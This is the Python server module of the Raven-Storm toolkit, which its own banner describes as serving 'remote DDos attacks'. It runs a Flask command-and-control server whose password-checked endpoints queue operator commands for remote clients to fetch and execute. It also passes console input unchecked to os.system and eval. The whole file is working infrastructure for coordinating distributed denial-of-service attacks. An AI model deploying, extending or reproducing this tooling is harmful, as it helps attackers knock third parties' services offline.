"""
Raven-Storm/modules/server/main.py
The Raven-Storm Toolkit - Server Module
Programmed and developed by Taguar258
Published under the MIT License
Based on the CLIF-Framework by Taguar258
"""

import os
from time import sleep

import flask
import requests
from CLIF_Framework.framework import console as clif_console
from CLIF_Framework.framework import event as clif_event
from CLIF_Framework.framework import tools as clif_tools
from flask import request

try:
    import readline  # noqa: F401
except ImportError:
    pass

clif_event = clif_event()
clif_tools = clif_tools()

class ServerModule:
    def __init__(self, console):
        """
        Initialize the Server module for Raven-Storm.
        """
        global var
        var = console  # noqa: VNE002

        # Colors
        var.C_None = "\x1b[0;39m"
        var.C_Bold = "\x1b[1;39m"
        var.C_Green = "\x1b[32m"
        var.C_Violet = "\x1b[34m"
        var.C_Dark_Blue = "\x1b[35m"
        var.C_Red = "\x1b[31m"
        var.C_Yellow = "\x1b[33m"
        var.C_Cyan = "\x1b[36m"

        var.host = "127.0.0.1"
        var.port = "5261"
        var.password = ""

    def banner(self):
        """
        Display the banner for the Server module.
        """
        banner_fire_color = var.C_Cyan
        banner_middle_color = var.C_Violet
        banner_bottom_color = var.C_Dark_Blue
        banner_logo = ("""C_Bo-----------------------------------------------------------C_W
C_FIRE (
 )\\ )                                 )
(()/(    )   )      (              ( /(      (       )
 /(_))( /(  /((    ))\\  (      (   )\\()) (   )(     (
(C_MID_C_FIRE))  )(_))(_))\\  /((_) )\\ )   )\\ (C_MID_C_FIRE))/  )\\ (()\\    )\\  'C_MID
| _ \\C_FIRE((C_MID_C_FIRE)C_MID_ _C_FIRE)((C_MID_C_FIRE)(C_MID_C_FIRE))  C_MID_C_FIRE(C_MID_C_FIRE/(  ((C_MID_C_FIRE)C_MID| |C_FIRE  ((C_MID_C_FIRE) ((C_MID_C_FIRE) C_MID_C_FIRE((C_MID_C_FIRE))C_MID
|   // _` |\\ V / / -_)| ' \\)) (_-<|  _|/ _ \\| '_|| '  \\C_FIRE()C_BOT
|_|_\\\\__,_| \\_/  \\___||_||_|  /__/ \\__|\\___/|_|  |_|_|_|C_W

----- The server module for the remote DDos attacks. -----

C_Bo-----------------------------------------------------------C_W""")
        banner_logo = banner_logo.replace("C_W", var.C_None)
        banner_logo = banner_logo.replace("C_Bo", var.C_Bold)
        banner_logo = banner_logo.replace("C_FIRE", banner_fire_color)
        banner_logo = banner_logo.replace("C_MID", banner_middle_color)
        banner_logo = banner_logo.replace("C_BOT", banner_bottom_color)
        print(banner_logo)

    @clif_event.event
    def on_ready():
        """
        Event triggered when the server module is ready.
        """
        os.system("clear || cls")
        ServerModule(var).banner()
        ServerModule(var)._add_commands()
        ServerModule(var).help()

    @clif_event.event
    def on_command_not_found(command):
        """
        Event triggered when a command is not found.
        """
        print("")
        print("The command you entered does not exist.")
        print("")

    def exit_console(self):
        """
        Exit the console.
        """
        print("Have a nice day.")
        quit()

    def _add_commands(self):
        """
        Add commands to the event handler.
        """
        clif_event.commands(self.exit_console, ["exit", "quit", "e", "q"])
        clif_event.commands(self.run_shell, ".")
        clif_event.commands(self.debug, "$")
        clif_event.commands(self.help, "help")
        clif_event.parser(self.run_debug_arg, "$")
        clif_event.parser(self.run_shell_arg, ".")
        
        clif_event.help(["exit", "quit", "e", "q"], "Exit Raven-Storm.")
        clif_event.help("help", "View all commands.")
        clif_event.help(".", "Run a shell command.")
        clif_event.help("clear", "Clear the screen.")
        clif_event.help("host", "Enter a host IP.")
        clif_event.help("port", "Enter the hosting port.")
        clif_event.help("password", "Setup a password.")
        clif_event.help("run", "Start the server.")

    def run_shell(self, command):
        """
        Run a shell command.
        """
        os.system(command)

    def run_shell_arg(self, command):
        """
        Parse and execute a shell command.
        """
        return clif_tools.arg("Enter shell command: ", ". ", command)

    def debug(self, command):
        """
        Execute a debug command.
        """
        eval(command)

    def run_debug_arg(self, command):
        """
        Parse and execute a debug command.
        """
        return clif_tools.arg("Enter debug command: ", "$ ", command)

    def help(self):
        """
        Display help messages.
        """
        clif_event.help_title("\x1b[1;39mServer Help:\x1b[0;39m")
        clif_tools.help("|-- ", " :: ", clif_event)
        print("")

    @clif_event.command
    def clear():
        """
        Clear the console screen.
        """
        os.system("clear || cls")

    @clif_event.event
    def on_command(command):
        """
        Event triggered when a command is executed.
        """
        if var.session[0][0]:
            var.session[0][1].write(command + "\n")
        if var.server[0] and var.server[1]:
            status = requests.post((var.server[2] + "set/com"), data={"password": var.server[3], "data": command}).text
            if status != "200":
                print("")
                print("An error occurred while sending commands to the server.")
                print("")

    @clif_event.command
    def host(command):
        """
        Set the host IP address.
        """
        print("")
        var.host = str(clif_tools.arg("IP: ", "host ", command))
        if "." not in var.host:
            print("Invalid IP.")
        print("")

    @clif_event.command
    def port(command):
        """
        Set the hosting port.
        """
        print("")
        try:
            var.port = int(clif_tools.arg("Port: ", "port ", command))
        except Exception as ex:
            print(f"An error occurred: {ex}")
        print("")

    @clif_event.command
    def password(command):
        """
        Set the server password.
        """
        print("")
        var.password = str(clif_tools.arg("Password: ", "password ", command))
        print("")

    @clif_event.command
    def run():
        """
        Start the server.
        """
        data = {"agreed": False, "commands": [""]}
        app = flask.Flask("Raven-Storm-Server")
        
        @app.route('/get/com<pos>', methods=["GET", "POST"])
        def command_get(pos=0):
            if request.form['password'] == var.password:
                try:
                    return str(data["commands"][int(pos)])
                except Exception:
                    return "500"
            else:
                return "Invalid Password"

        @app.route('/get/agreed', methods=["GET", "POST"])
        def agreed_get():
            if request.form['password'] == var.password:
                return str(data["agreed"])
            else:
                return "Invalid Password"

        @app.route('/set/com', methods=["GET", "POST"])
        def command_set():
            if request.form['password'] == var.password:
                data["commands"].append(request.form["data"])
                return "200"
            else:
                return "Invalid Password"

        @app.route('/set/agreed', methods=["GET", "POST"])
        def agreed_set():
            if request.form['password'] == var.password:
                data["agreed"] = request.form["data"]
                return "200"
            else:
                return "Invalid Password"

        @app.route('/reset', methods=["GET", "POST"])
        def reset_data():
            if request.form['password'] == var.password:
                data = {"agreed": False, "commands": [""]}
                return "200"
            else:
                return "Invalid Password"

        app.run(host=var.host, port=var.port, use_reloader=False)
        var.stop()
        quit()


def setup(console):
    """
    Setup the Server module for Raven-Storm.
    """
    console.ps1 = "Server> "
    console.add(ServerModule(console), clif_event)
